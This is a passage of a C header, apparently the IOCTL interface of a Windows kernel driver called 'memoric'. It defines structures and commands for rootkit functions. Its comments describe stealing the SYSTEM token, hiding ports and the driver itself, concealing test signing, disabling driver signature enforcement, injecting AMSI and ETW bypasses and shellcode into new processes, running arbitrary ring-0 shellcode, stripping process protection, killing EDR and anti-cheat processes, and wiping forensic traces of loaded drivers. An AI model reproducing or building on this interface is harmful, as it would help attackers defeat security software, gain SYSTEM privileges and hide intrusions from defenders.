    USHORT  Protocol;       /* 0=TCP, 1=UDP */
} MEMORIC_PORT_HIDE_REQUEST, *PMEMORIC_PORT_HIDE_REQUEST;

typedef struct _MEMORIC_PORT_HIDE_ENTRY {
    USHORT  Port;           /* port number */
    USHORT  Protocol;       /* 0=TCP, 1=UDP */
} MEMORIC_PORT_HIDE_ENTRY, *PMEMORIC_PORT_HIDE_ENTRY;

/* ================================================================
 * Token Duplicate — Steal and replace process token
 * ================================================================ */

#define MEMORIC_TOKEN_COPY          0   /* Copy token from source to target */
#define MEMORIC_TOKEN_SYSTEM        1   /* Give SYSTEM token to target */
#define MEMORIC_TOKEN_RESTORE       2   /* Restore original token */

typedef struct _MEMORIC_TOKEN_DUP_REQUEST {
    ULONG   TargetPid;      /* process to modify */
    ULONG   SourcePid;      /* process to copy token from (0 = System PID 4) */
    ULONG   Action;         /* MEMORIC_TOKEN_* */
    ULONG   Reserved;
} MEMORIC_TOKEN_DUP_REQUEST, *PMEMORIC_TOKEN_DUP_REQUEST;

typedef struct _MEMORIC_TOKEN_DUP_RESPONSE {
    ULONG64 OriginalToken;  /* address of original token */
    ULONG64 NewToken;       /* address of new token */
    ULONG   TargetPid;
    ULONG   SourcePid;
} MEMORIC_TOKEN_DUP_RESPONSE, *PMEMORIC_TOKEN_DUP_RESPONSE;

/* ================================================================
 * Object Hook — Register OB_OPERATION_REGISTRATION callbacks
 * ================================================================ */

#define MEMORIC_OBJ_HOOK_REGISTER   0   /* Register object callback */
#define MEMORIC_OBJ_HOOK_UNREGISTER 1   /* Unregister object callback */
#define MEMORIC_OBJ_HOOK_QUERY      2   /* Query interceptions */

#define MEMORIC_OBJ_TYPE_PROCESS    0   /* PsProcessType */
#define MEMORIC_OBJ_TYPE_THREAD     1   /* PsThreadType */

typedef struct _MEMORIC_OBJECT_HOOK_REQUEST {
    ULONG   Action;         /* MEMORIC_OBJ_HOOK_* */
    ULONG   ObjectType;     /* MEMORIC_OBJ_TYPE_* */
    ULONG   ProtectPid;     /* PID to protect (strip access from opens) */
    ULONG   StripAccess;    /* Access bits to strip (e.g. PROCESS_VM_READ) */
} MEMORIC_OBJECT_HOOK_REQUEST, *PMEMORIC_OBJECT_HOOK_REQUEST;

typedef struct _MEMORIC_OBJECT_HOOK_RESPONSE {
    ULONG   Registered;     /* 1=process callback active, 0=not */
    ULONG   InterceptionCount; /* total interceptions so far */
    ULONG   ProtectedPid;
    ULONG   StrippedAccess;
} MEMORIC_OBJECT_HOOK_RESPONSE, *PMEMORIC_OBJECT_HOOK_RESPONSE;

typedef struct _MEMORIC_CAPABILITIES_RESPONSE {
    ULONG   Size;               /* sizeof(MEMORIC_CAPABILITIES_RESPONSE) */
    ULONG   AbiVersion;         /* MEMORIC_ABI_VERSION */
    ULONG   DriverVersion;      /* MEMORIC_DRIVER_VERSION */
    ULONG   BuildNumber;        /* Windows build used for resolved offsets */
    ULONG   MaxIoSize;          /* MEMORIC_MAX_IO_SIZE */
    ULONG   MaxForceWrite;      /* MEMORIC_MAX_FORCE_WRITE */
    ULONG   OffsetsResolved;    /* 1 if EPROCESS offsets resolved */
    ULONG   Reserved;
    ULONG64 CapabilityFlags;    /* MEMORIC_CAP_* bitmap */
    ULONG64 CapabilityFlags2;   /* reserved for future flags */
} MEMORIC_CAPABILITIES_RESPONSE, *PMEMORIC_CAPABILITIES_RESPONSE;
/* sizeof = 48 */

/* ── Driver Health/Stats ──────────────────────────────────────────── */
typedef struct _MEMORIC_DRIVER_STATS {
    ULONG   TotalIoctls;        /* total IOCTLs processed */
    ULONG   SuccessIoctls;      /* successful completions */
    ULONG   FailedIoctls;       /* failed completions */
    ULONG   ExceptionCount;     /* caught exceptions in handlers */
    ULONG   OpenHandles;        /* currently open handles */
    ULONG   BuildNumber;        /* Windows build number */
    ULONG   DriverVersion;      /* memoric driver version (major<<16 | minor) */
    ULONG   OffsetsResolved;    /* 1 if EPROCESS offsets resolved */
    ULONG   NotifyProcessActive; /* 1 if process notify registered */
    ULONG   NotifyThreadActive;  /* 1 if thread notify registered */
    ULONG   NotifyImageActive;   /* 1 if image notify registered */
    ULONG   RegCallbackActive;   /* 1 if registry callback registered */
    ULONG   ObCallbackActive;    /* 1 if object callback registered */
    ULONG   DpcTimersActive;     /* count of active DPC timers */
    ULONG   HiddenPortCount;     /* number of hidden ports */
    ULONG   ProtectedKeyCount;   /* number of protected registry keys */
} MEMORIC_DRIVER_STATS, *PMEMORIC_DRIVER_STATS;

/* ================================================================
 * Memory Pool Query
 * ================================================================ */

/* Request: query kernel pool allocations by tag */
typedef struct _MEMORIC_POOL_QUERY_REQUEST {
    ULONG   PoolTag;            /* 4-byte pool tag to search (e.g. 'croM') */
    ULONG   MaxEntries;         /* max entries to return (0 = default 256) */
} MEMORIC_POOL_QUERY_REQUEST, *PMEMORIC_POOL_QUERY_REQUEST;

/* Single pool allocation entry */
typedef struct _MEMORIC_POOL_ENTRY {
    ULONG64 Address;            /* virtual address of allocation */
    ULONG64 Size;               /* allocation size */
    ULONG   PoolTag;            /* pool tag */
    ULONG   PoolType;           /* NonPagedPool=0, PagedPool=1 */
} MEMORIC_POOL_ENTRY, *PMEMORIC_POOL_ENTRY;

/* Response: pool query results */
typedef struct _MEMORIC_POOL_QUERY_RESPONSE {
    ULONG   EntryCount;         /* number of entries returned */
    ULONG   TotalAllocations;   /* total matching allocations (may exceed MaxEntries) */
    MEMORIC_POOL_ENTRY Entries[1]; /* variable-length array */
} MEMORIC_POOL_QUERY_RESPONSE, *PMEMORIC_POOL_QUERY_RESPONSE;

/* ================================================================
 * Minifilter Enumeration
 * ================================================================ */

/* Single minifilter instance entry */
typedef struct _MEMORIC_MINIFILTER_ENTRY {
    WCHAR   FilterName[64];     /* filter name (e.g. L"WdFilter") */
    WCHAR   Altitude[32];       /* altitude string */
    ULONG   FrameId;            /* frame ID */
    ULONG   NumberOfInstances;  /* number of attached instances */
    ULONG   Flags;              /* filter flags */
    ULONG   Reserved;
} MEMORIC_MINIFILTER_ENTRY, *PMEMORIC_MINIFILTER_ENTRY;

/* Response: minifilter enumeration */
typedef struct _MEMORIC_MINIFILTER_RESPONSE {
    ULONG   FilterCount;        /* number of filters returned */
    ULONG   Reserved;
    MEMORIC_MINIFILTER_ENTRY Entries[1]; /* variable-length array */
} MEMORIC_MINIFILTER_RESPONSE, *PMEMORIC_MINIFILTER_RESPONSE;

/* ================================================================
 * Process Memory Dump
 * ================================================================ */

/* Request: dump process memory regions */
typedef struct _MEMORIC_PROCESS_DUMP_REQUEST {
    ULONG   ProcessId;          /* target process ID */
    ULONG   Flags;              /* 0=all, 1=executable only, 2=committed only */
    ULONG64 BaseAddress;        /* start address (0=beginning) */
    ULONG64 MaxSize;            /* max bytes to dump (0=no limit up to 16MB) */
} MEMORIC_PROCESS_DUMP_REQUEST, *PMEMORIC_PROCESS_DUMP_REQUEST;

/* Single memory region descriptor */
typedef struct _MEMORIC_REGION_ENTRY {
    ULONG64 BaseAddress;        /* region base address */
    ULONG64 RegionSize;         /* region size */
    ULONG   State;              /* MEM_COMMIT, MEM_RESERVE, MEM_FREE */
    ULONG   Protect;            /* PAGE_* protection */
    ULONG   Type;               /* MEM_IMAGE, MEM_MAPPED, MEM_PRIVATE */
    ULONG   Reserved;
} MEMORIC_REGION_ENTRY, *PMEMORIC_REGION_ENTRY;

/* Response: process memory dump */
typedef struct _MEMORIC_PROCESS_DUMP_RESPONSE {
    ULONG   RegionCount;        /* number of regions returned */
    ULONG   TotalRegions;       /* total regions matching filter */
    ULONG64 TotalSize;          /* total bytes across all regions */
    MEMORIC_REGION_ENTRY Regions[1]; /* variable-length array */
} MEMORIC_PROCESS_DUMP_RESPONSE, *PMEMORIC_PROCESS_DUMP_RESPONSE;

/* ================================================================
 * Kernel-Level Hypervisor Detection
 * ================================================================ */

/* Response: hypervisor detection results (kernel-level) */
typedef struct _MEMORIC_HYPERVISOR_DETECT_RESPONSE {
    ULONG   HypervisorPresent;  /* 1 if CPUID says hypervisor present */
    ULONG   HypervisorType;     /* 0=none, 1=Hyper-V, 2=VMware, 3=VBox, 4=KVM, 5=QEMU, 6=Xen, 7=unknown */
    CHAR    VendorId[16];       /* hypervisor vendor string from CPUID */
    ULONG   NestingLevel;       /* detected nesting level (0=bare metal) */
    ULONG   TimingAnomaly;      /* 1 if RDTSC/RDTSCP timing anomaly detected */
    ULONG   MsrAnomaly;         /* 1 if MSR access anomaly detected */
    ULONG   IdtAnomaly;         /* 1 if IDT base is in unusual range */
    ULONG   CpuidLeafCount;     /* number of hypervisor CPUID leaves */
    ULONG   Reserved;
} MEMORIC_HYPERVISOR_DETECT_RESPONSE, *PMEMORIC_HYPERVISOR_DETECT_RESPONSE;

/* ================================================================
 * Test Signing Concealment (Kernel-Level)
 * ================================================================ */

#define MEMORIC_TESTSIGN_QUERY          0   /* Query current test signing state from kernel */
#define MEMORIC_TESTSIGN_HIDE_SHARED    1   /* Patch SharedUserData to hide test mode */
#define MEMORIC_TESTSIGN_HIDE_CI        2   /* Patch ci.dll g_CiOptions to clear test signing */
#define MEMORIC_TESTSIGN_RESTORE        3   /* Restore original values */

typedef struct _MEMORIC_TESTSIGN_REQUEST {
    ULONG   Action;             /* MEMORIC_TESTSIGN_* */
    ULONG   Reserved;
} MEMORIC_TESTSIGN_REQUEST, *PMEMORIC_TESTSIGN_REQUEST;

typedef struct _MEMORIC_TESTSIGN_RESPONSE {
    ULONG   TestSigningActive;  /* 1 if test signing detected before operation */
    ULONG   Action;             /* action performed */
    ULONG   CiOptions;          /* current ci.dll g_CiOptions value */
    ULONG   SharedUserPatched;  /* 1 if SharedUserData was patched */
    ULONG64 CiOptionsAddress;   /* address of g_CiOptions in kernel */
    ULONG64 SharedUserAddress;  /* KUSER_SHARED_DATA base */
} MEMORIC_TESTSIGN_RESPONSE, *PMEMORIC_TESTSIGN_RESPONSE;

/* ================================================================
 * Kernel Global Hook — syscall/inline hooking from kernel
 * ================================================================ */

#define MEMORIC_GHOOK_INSTALL       0   /* Install global hook */
#define MEMORIC_GHOOK_REMOVE        1   /* Remove global hook */
#define MEMORIC_GHOOK_QUERY         2   /* Query active hooks */

#define MEMORIC_GHOOK_TYPE_INLINE   0   /* Inline hook (patch function prologue) */
#define MEMORIC_GHOOK_TYPE_IAT      1   /* IAT hook (kernel module IAT patching) */
#define MEMORIC_GHOOK_TYPE_INFINITY 2   /* Infinity hook (WMI/ETW-based) */

#define MEMORIC_MAX_GLOBAL_HOOKS    16

typedef struct _MEMORIC_GLOBAL_HOOK_REQUEST {
    ULONG   Action;             /* MEMORIC_GHOOK_* */
    ULONG   HookType;           /* MEMORIC_GHOOK_TYPE_* */
    ULONG   HookIndex;          /* hook slot (0-15) for remove/query */
    ULONG   Reserved;
    CHAR    TargetModule[64];   /* e.g. "ntoskrnl.exe", "ci.dll" */
    CHAR    TargetFunction[64]; /* e.g. "NtQuerySystemInformation" */
    ULONG64 ReplacementAddr;    /* address of replacement function (0=use built-in) */
} MEMORIC_GLOBAL_HOOK_REQUEST, *PMEMORIC_GLOBAL_HOOK_REQUEST;

typedef struct _MEMORIC_GLOBAL_HOOK_ENTRY {
    ULONG   Index;              /* slot index */
    ULONG   Active;             /* 1=active, 0=inactive */
    ULONG   HookType;           /* hook type used */
    ULONG   HitCount;           /* number of times hook fired */
    CHAR    TargetModule[64];
    CHAR    TargetFunction[64];
    ULONG64 OriginalAddress;    /* original function address */
    ULONG64 HookAddress;        /* current hook handler address */
    UCHAR   OriginalBytes[16];  /* saved original prologue bytes */
} MEMORIC_GLOBAL_HOOK_ENTRY, *PMEMORIC_GLOBAL_HOOK_ENTRY;

typedef struct _MEMORIC_GLOBAL_HOOK_RESPONSE {
    ULONG   HookCount;          /* number of active hooks */
    ULONG   Reserved;
    MEMORIC_GLOBAL_HOOK_ENTRY Entries[1]; /* variable-length */
} MEMORIC_GLOBAL_HOOK_RESPONSE, *PMEMORIC_GLOBAL_HOOK_RESPONSE;

/* ================================================================
 * Auto-Inject — kernel-driven process injection on creation
 * ================================================================ */

#define MEMORIC_AUTOINJECT_ENABLE       0   /* Enable auto-injection */
#define MEMORIC_AUTOINJECT_DISABLE      1   /* Disable auto-injection */
#define MEMORIC_AUTOINJECT_QUERY        2   /* Query status */
#define MEMORIC_AUTOINJECT_SET_PAYLOAD  3   /* Set injection payload */

#define MEMORIC_AUTOINJECT_FLAG_NTQUERY   0x01   /* Inject NtQuerySystemInformation hook */
#define MEMORIC_AUTOINJECT_FLAG_ETW       0x02   /* Inject ETW disable patch */
#define MEMORIC_AUTOINJECT_FLAG_AMSI      0x04   /* Inject AMSI bypass */
#define MEMORIC_AUTOINJECT_FLAG_CUSTOM    0x08   /* Inject custom shellcode */

typedef struct _MEMORIC_AUTO_INJECT_REQUEST {
    ULONG   Action;             /* MEMORIC_AUTOINJECT_* */
    ULONG   Flags;              /* MEMORIC_AUTOINJECT_FLAG_* bitmask */
    ULONG   MaxPayloadSize;     /* max shellcode size (for SET_PAYLOAD) */
    ULONG   Reserved;
    WCHAR   ProcessFilter[64];  /* optional: only inject into matching process names (empty=all) */
} MEMORIC_AUTO_INJECT_REQUEST, *PMEMORIC_AUTO_INJECT_REQUEST;

typedef struct _MEMORIC_AUTO_INJECT_RESPONSE {
    ULONG   Enabled;            /* 1 if auto-injection is active */
    ULONG   Flags;              /* current injection flags */
    ULONG   ProcessesInjected;  /* total processes injected so far */
    ULONG   ProcessesFailed;    /* total injection failures */
    ULONG   ProcessesSkipped;   /* processes skipped by filter */
    ULONG   Reserved;
    WCHAR   ProcessFilter[64];  /* current filter */
} MEMORIC_AUTO_INJECT_RESPONSE, *PMEMORIC_AUTO_INJECT_RESPONSE;

/* ================================================================
 * Infinity Hook — WMI/ETW tracing-based syscall interception
 * ================================================================ */

#define MEMORIC_INFHOOK_ENABLE      0   /* Enable infinity hook */
#define MEMORIC_INFHOOK_DISABLE     1   /* Disable infinity hook */
#define MEMORIC_INFHOOK_QUERY       2   /* Query status */

typedef struct _MEMORIC_INFINITY_HOOK_REQUEST {
    ULONG   Action;             /* MEMORIC_INFHOOK_* */
    ULONG   SyscallNumber;      /* specific syscall to hook (0=NtQuerySystemInformation) */
    ULONG64 HandlerAddress;     /* custom handler address (0=use built-in testsign handler) */
} MEMORIC_INFINITY_HOOK_REQUEST, *PMEMORIC_INFINITY_HOOK_REQUEST;

typedef struct _MEMORIC_INFINITY_HOOK_RESPONSE {
    ULONG   Enabled;            /* 1 if infinity hook active */
    ULONG   SyscallNumber;      /* hooked syscall */
    ULONG   InterceptionCount;  /* total interceptions */
    ULONG   Reserved;
    ULONG64 GetCpuClockAddr;    /* address of HalPrivateDispatchTable.GetCpuClock */
    ULONG64 OriginalHandler;    /* original GetCpuClock handler */
} MEMORIC_INFINITY_HOOK_RESPONSE, *PMEMORIC_INFINITY_HOOK_RESPONSE;

/* ================================================================
 * Kernel Module Base Query
 * ================================================================ */

typedef struct _MEMORIC_MODULE_BASE_REQUEST {
    CHAR    ModuleName[256];    /* Module name to find (e.g. "CI.dll", "ntoskrnl.exe") */
} MEMORIC_MODULE_BASE_REQUEST, *PMEMORIC_MODULE_BASE_REQUEST;

typedef struct _MEMORIC_MODULE_BASE_RESPONSE {
    ULONG64 ModuleBase;         /* Kernel virtual address of module base */
    ULONG   ModuleSize;         /* Size of module in bytes */
    ULONG   Found;              /* 1 if module was found, 0 otherwise */
} MEMORIC_MODULE_BASE_RESPONSE, *PMEMORIC_MODULE_BASE_RESPONSE;

/* ================================================================
 * CI Callback Patch — Replace SeCiCallbacks entry in ntoskrnl
 * with ZwFlushInstructionCache (always returns TRUE).
 * Anti-cheat monitors DSE value but not callback pointers.
 * ================================================================ */

#define MEMORIC_CI_CALLBACK_PATCH   0   /* Patch: replace pointer */
#define MEMORIC_CI_CALLBACK_RESTORE 1   /* Restore original pointer */
#define MEMORIC_CI_CALLBACK_QUERY   2   /* Query current state */

typedef struct _MEMORIC_CI_CALLBACK_REQUEST {
    ULONG   Action;             /* MEMORIC_CI_CALLBACK_* */
    ULONG   Reserved;
} MEMORIC_CI_CALLBACK_REQUEST, *PMEMORIC_CI_CALLBACK_REQUEST;

typedef struct _MEMORIC_CI_CALLBACK_RESPONSE {
    ULONG   Success;            /* 1 on success */
    ULONG   Patched;            /* 1 if currently patched */
    ULONG64 SeCiCallbacksAddr;  /* VA of SeCiCallbacks in ntoskrnl */
    ULONG64 OriginalPtr;        /* Original CiValidateImageHeader pointer */
    ULONG64 CurrentPtr;         /* Current pointer value */
    ULONG64 ZwFlushAddr;        /* VA of ZwFlushInstructionCache */
} MEMORIC_CI_CALLBACK_RESPONSE, *PMEMORIC_CI_CALLBACK_RESPONSE;

/* ================================================================
 * CI Function Patch — Patch CiValidateImageHeader prologue in CI.dll
 * to "xor eax,eax; ret" (return STATUS_SUCCESS). Uses PTE manipulation
 * to make the page writable without CR0.WP (Hyper-V safe).
 * ================================================================ */

#define MEMORIC_CI_FUNC_PATCH      0   /* Patch function */
#define MEMORIC_CI_FUNC_RESTORE    1   /* Restore original bytes */
#define MEMORIC_CI_FUNC_QUERY      2   /* Query current state */

typedef struct _MEMORIC_CI_FUNC_PATCH_REQUEST {
    ULONG   Action;             /* MEMORIC_CI_FUNC_* */
    ULONG   Reserved;
} MEMORIC_CI_FUNC_PATCH_REQUEST, *PMEMORIC_CI_FUNC_PATCH_REQUEST;

typedef struct _MEMORIC_CI_FUNC_PATCH_RESPONSE {
    ULONG   Success;            /* 1 on success */
    ULONG   Patched;            /* 1 if currently patched */
    ULONG64 CiValidateAddr;     /* VA of CiValidateImageHeader */
    UCHAR   OriginalBytes[16];  /* Saved original prologue bytes */
    UCHAR   CurrentBytes[16];   /* Current bytes at function start */
} MEMORIC_CI_FUNC_PATCH_RESPONSE, *PMEMORIC_CI_FUNC_PATCH_RESPONSE;

/* ================================================================
 * PTE Read/Write — Get/modify page table entries for any VA.
 * Uses MiGetPteAddress pattern scan from ntoskrnl .text section.
 * ================================================================ */

#define MEMORIC_PTE_READ            0   /* Read PTE for given VA */
#define MEMORIC_PTE_WRITE           1   /* Modify PTE for given VA */
#define MEMORIC_PTE_MAKE_WRITABLE   2   /* Set writable bit in PTE */
#define MEMORIC_PTE_RESTORE         3   /* Restore original PTE */

typedef struct _MEMORIC_PTE_REQUEST {
    ULONG   Action;             /* MEMORIC_PTE_* */
    ULONG   Reserved;
    ULONG64 VirtualAddress;     /* Target virtual address */
    ULONG64 NewPteValue;        /* For PTE_WRITE: new PTE value */
} MEMORIC_PTE_REQUEST, *PMEMORIC_PTE_REQUEST;

typedef struct _MEMORIC_PTE_RESPONSE {
    ULONG   Success;            /* 1 on success */
    ULONG   Reserved;
    ULONG64 VirtualAddress;     /* Target VA */
    ULONG64 PteAddress;         /* VA of the PTE entry */
    ULONG64 PteValue;           /* Current PTE value */
    ULONG64 OriginalPteValue;   /* Original PTE value (before modification) */
    ULONG64 PteBase;            /* PTE base address (from MiGetPteAddress) */
} MEMORIC_PTE_RESPONSE, *PMEMORIC_PTE_RESPONSE;

/* ================================================================
 * MSR Read/Write — rdmsr / wrmsr any Model Specific Register.
 * Enables LSTAR manipulation, IA32_DEBUGCTL, SMEP/SMAP control etc.
 * ================================================================ */

#define MEMORIC_MSR_READ   0
#define MEMORIC_MSR_WRITE  1

typedef struct _MEMORIC_MSR_REQUEST {
    ULONG   Action;         /* MEMORIC_MSR_READ or MEMORIC_MSR_WRITE */
    ULONG   MsrIndex;       /* MSR register number (e.g. 0xC0000082 = IA32_LSTAR) */
    ULONG64 Value;          /* Value to write (for MSR_WRITE) */
} MEMORIC_MSR_REQUEST, *PMEMORIC_MSR_REQUEST;

typedef struct _MEMORIC_MSR_RESPONSE {
    ULONG   Success;
    ULONG   MsrIndex;
    ULONG64 Value;          /* Current / read value */
    ULONG64 OldValue;       /* Previous value (for writes) */
} MEMORIC_MSR_RESPONSE, *PMEMORIC_MSR_RESPONSE;

/* ================================================================
 * Driver Cloak — DKOM-based hiding from PsLoadedModuleList.
 * Unlinks driver from kernel module list + clears MmUnloadedDrivers.
 * ================================================================ */

#define MEMORIC_CLOAK_SELF     0   /* Cloak our own driver */
#define MEMORIC_CLOAK_TARGET   1   /* Cloak a named driver */
#define MEMORIC_CLOAK_QUERY    2   /* Query cloaking status */

typedef struct _MEMORIC_DRIVER_CLOAK_REQUEST {
    ULONG   Action;                 /* MEMORIC_CLOAK_* */
    ULONG   Reserved;
    WCHAR   DriverName[64];         /* Target driver name (for CLOAK_TARGET) */
} MEMORIC_DRIVER_CLOAK_REQUEST, *PMEMORIC_DRIVER_CLOAK_REQUEST;

typedef struct _MEMORIC_DRIVER_CLOAK_RESPONSE {
    ULONG   Success;
    ULONG   Cloaked;                /* 1 if currently cloaked */
    ULONG64 DriverObjectAddr;       /* DRIVER_OBJECT address */
    ULONG64 DriverSectionAddr;      /* LDR_DATA_TABLE_ENTRY address */
    ULONG   EntriesRemoved;         /* Count of list entries unlinked */
} MEMORIC_DRIVER_CLOAK_RESPONSE, *PMEMORIC_DRIVER_CLOAK_RESPONSE;

/* ================================================================
 * Force Kill — Terminate any process from kernel context.
 * Bypasses all protection: PPL, anti-cheat, EDR, etc.
 * ================================================================ */

#define MEMORIC_KILL_TERMINATE     0   /* ZwTerminateProcess from kernel */
#define MEMORIC_KILL_DKOM          1   /* DKOM: unlink from ActiveProcessLinks */
#define MEMORIC_KILL_THREAD_KILL   2   /* Kill all threads in process */

typedef struct _MEMORIC_FORCE_KILL_REQUEST {
    ULONG   Action;                 /* MEMORIC_KILL_* */
    ULONG   ProcessId;              /* Target PID */
    ULONG   ExitCode;               /* Exit status code */
    ULONG   Reserved;
} MEMORIC_FORCE_KILL_REQUEST, *PMEMORIC_FORCE_KILL_REQUEST;

typedef struct _MEMORIC_FORCE_KILL_RESPONSE {
    ULONG   Success;
    ULONG   ProcessId;
    ULONG   Method;                 /* Which method succeeded */
    ULONG   ThreadsKilled;          /* Count of threads killed */
    ULONG64 EprocessAddr;           /* EPROCESS address */
} MEMORIC_FORCE_KILL_RESPONSE, *PMEMORIC_FORCE_KILL_RESPONSE;

/* ================================================================
 * Force Delete — Delete locked/protected files from kernel.
 * Uses IRP-based file operations that bypass user-mode locks.
 * ================================================================ */

#define MEMORIC_DELETE_FILE        0   /* Delete a file */
#define MEMORIC_DELETE_DIRECTORY   1   /* Delete a directory (empty) */
#define MEMORIC_DELETE_FORCE       2   /* Force delete (close handles first) */

typedef struct _MEMORIC_FORCE_DELETE_REQUEST {
    ULONG   Action;                 /* MEMORIC_DELETE_* */
    ULONG   Reserved;
    WCHAR   FilePath[260];          /* NT path (e.g. \??\C:\path\file.ext) */
} MEMORIC_FORCE_DELETE_REQUEST, *PMEMORIC_FORCE_DELETE_REQUEST;

typedef struct _MEMORIC_FORCE_DELETE_RESPONSE {
    ULONG   Success;
    ULONG   Reserved;
    ULONG64 NtStatus;               /* Detailed NTSTATUS */
} MEMORIC_FORCE_DELETE_RESPONSE, *PMEMORIC_FORCE_DELETE_RESPONSE;

/* ================================================================
 * System Thread — Create kernel threads to execute code at ring 0.
 * Payload address must be in NonPagedPool or mapped kernel memory.
 * ================================================================ */

#define MEMORIC_THREAD_CREATE      0   /* Create system thread */
#define MEMORIC_THREAD_QUERY       1   /* Query running threads */

typedef struct _MEMORIC_SYSTEM_THREAD_REQUEST {
    ULONG   Action;                 /* MEMORIC_THREAD_* */
    ULONG   Reserved;
    ULONG64 StartAddress;           /* Entry point in kernel space */
    ULONG64 Context;                /* Parameter to pass to thread */
} MEMORIC_SYSTEM_THREAD_REQUEST, *PMEMORIC_SYSTEM_THREAD_REQUEST;

typedef struct _MEMORIC_SYSTEM_THREAD_RESPONSE {
    ULONG   Success;
    ULONG   Reserved;
    ULONG64 ThreadHandle;           /* Kernel thread handle */
    ULONG64 ThreadId;               /* Thread ID */
} MEMORIC_SYSTEM_THREAD_RESPONSE, *PMEMORIC_SYSTEM_THREAD_RESPONSE;

/* ================================================================
 * Kernel Exec — Allocate + copy + execute arbitrary shellcode in
 * nonpaged kernel pool. Full ring-0 code execution primitive.
 * ================================================================ */

#define MEMORIC_EXEC_RUN           0   /* Allocate, copy, execute */
#define MEMORIC_EXEC_ALLOC         1   /* Allocate only, return address */
#define MEMORIC_EXEC_FREE          2   /* Free allocated region */

typedef struct _MEMORIC_KERNEL_EXEC_REQUEST {
    ULONG   Action;                 /* MEMORIC_EXEC_* */
    ULONG   ShellcodeSize;          /* Size of shellcode in bytes */
    ULONG64 AllocatedAddress;       /* For EXEC_FREE: address to free */
    /* Shellcode bytes follow immediately after this struct in the buffer */
} MEMORIC_KERNEL_EXEC_REQUEST, *PMEMORIC_KERNEL_EXEC_REQUEST;

typedef struct _MEMORIC_KERNEL_EXEC_RESPONSE {
    ULONG   Success;
    ULONG   Reserved;
    ULONG64 AllocatedAddress;       /* Kernel VA of allocated region */
    ULONG64 ReturnValue;            /* Return value from shellcode (RAX) */
} MEMORIC_KERNEL_EXEC_RESPONSE, *PMEMORIC_KERNEL_EXEC_RESPONSE;

/* ================================================================
 * PPL (Protected Process Light) Bypass
 * Modifies PS_PROTECTION byte in EPROCESS to strip/set protection level.
 * ================================================================ */

#define MEMORIC_PPL_STRIP      0   /* Remove protection */
#define MEMORIC_PPL_SET        1   /* Set protection level */
#define MEMORIC_PPL_QUERY      2   /* Query current protection */

typedef struct _MEMORIC_PPL_BYPASS_REQUEST {
    ULONG   Action;             /* MEMORIC_PPL_* */
    ULONG   ProcessId;
    UCHAR   ProtectionLevel;    /* PS_PROTECTED_SIGNER value (for SET) */
    UCHAR   Reserved[7];
} MEMORIC_PPL_BYPASS_REQUEST, *PMEMORIC_PPL_BYPASS_REQUEST;

typedef struct _MEMORIC_PPL_BYPASS_RESPONSE {
    ULONG   Success;
    ULONG   ProcessId;
    ULONG64 EprocessAddr;
    UCHAR   OldProtection;      /* Original PS_PROTECTION byte */
    UCHAR   NewProtection;      /* New PS_PROTECTION byte */
    UCHAR   Reserved[6];
} MEMORIC_PPL_BYPASS_RESPONSE, *PMEMORIC_PPL_BYPASS_RESPONSE;

/* ================================================================
 * Control Register R/W — Read/write CR0, CR3, CR4
 * Useful for: CR0.WP (write protect), CR4.SMEP/SMAP bypass
 * ================================================================ */

#define MEMORIC_CR_READ        0
#define MEMORIC_CR_WRITE       1

typedef struct _MEMORIC_CR_REQUEST {
    ULONG   Action;             /* MEMORIC_CR_* */
    ULONG   CrIndex;            /* 0=CR0, 3=CR3, 4=CR4 */
    ULONG64 Value;              /* New value (for write) */
} MEMORIC_CR_REQUEST, *PMEMORIC_CR_REQUEST;

typedef struct _MEMORIC_CR_RESPONSE {
    ULONG   Success;
    ULONG   CrIndex;
    ULONG64 Value;              /* Current/new value */
    ULONG64 OldValue;           /* Previous value (for write) */
} MEMORIC_CR_RESPONSE, *PMEMORIC_CR_RESPONSE;

/* ================================================================
 * IDT Read/Write — Read/modify Interrupt Descriptor Table entries.
 * Each IDT entry (KIDTENTRY64) is 16 bytes on x64.
 * ================================================================ */

#define MEMORIC_IDT_READ       0   /* Read IDT entry */
#define MEMORIC_IDT_WRITE      1   /* Write IDT entry */
#define MEMORIC_IDT_DUMP       2   /* Dump all 256 entries */

typedef struct _MEMORIC_IDT_REQUEST {
    ULONG   Action;
    ULONG   Vector;             /* Interrupt vector (0-255) */
    ULONG64 NewHandler;         /* New ISR address (for write) */
    USHORT  NewDPL;             /* New DPL (0-3) */
    USHORT  Reserved[3];
} MEMORIC_IDT_REQUEST, *PMEMORIC_IDT_REQUEST;

typedef struct _MEMORIC_IDT_RESPONSE {
    ULONG   Success;
    ULONG   Vector;
    ULONG64 HandlerAddress;     /* Current ISR address */
    ULONG64 OldHandlerAddress;  /* Previous ISR (for write) */
    USHORT  Segment;            /* Segment selector */
    USHORT  DPL;                /* Descriptor Privilege Level */
    USHORT  Type;               /* Gate type (interrupt/trap) */
    USHORT  Present;
    ULONG64 IdtBase;            /* IDT base address (from IDTR) */
    USHORT  IdtLimit;           /* IDT limit */
    USHORT  Reserved[3];
} MEMORIC_IDT_RESPONSE, *PMEMORIC_IDT_RESPONSE;

/* ================================================================
 * Unloaded Drivers Clear — Clean MmUnloadedDrivers array.
 * Removes forensic evidence of previously loaded/unloaded drivers.
 * ================================================================ */

#define MEMORIC_UNLOADED_CLEAR_ALL     0   /* Clear entire array */
#define MEMORIC_UNLOADED_CLEAR_NAME    1   /* Clear specific driver by name */
#define MEMORIC_UNLOADED_QUERY         2   /* Query entries */

typedef struct _MEMORIC_UNLOADED_DRV_REQUEST {
    ULONG   Action;
    ULONG   Reserved;
    WCHAR   DriverName[64];     /* For CLEAR_NAME */
} MEMORIC_UNLOADED_DRV_REQUEST, *PMEMORIC_UNLOADED_DRV_REQUEST;

typedef struct _MEMORIC_UNLOADED_DRV_RESPONSE {
    ULONG   Success;
    ULONG   EntriesCleared;
    ULONG   TotalEntries;
    ULONG   Reserved;
    ULONG64 MmUnloadedDriversAddr;
} MEMORIC_UNLOADED_DRV_RESPONSE, *PMEMORIC_UNLOADED_DRV_RESPONSE;

/* ================================================================
 * Token Steal — Direct EPROCESS->Token swap.
 * Copies System (PID 4) token to target process, granting
 * NT AUTHORITY\SYSTEM privileges.
 * ================================================================ */

#define MEMORIC_TOKEN_STEAL        0   /* Steal System token */
#define MEMORIC_TOKEN_SWAP         1   /* Swap token from source */
#define MEMORIC_TOKEN_QUERY        2   /* Query current token */

typedef struct _MEMORIC_TOKEN_STEAL_REQUEST {
    ULONG   Action;
    ULONG   TargetPid;          /* Process to receive token */
    ULONG   SourcePid;          /* For SWAP: source PID (0=System) */
    ULONG   Reserved;
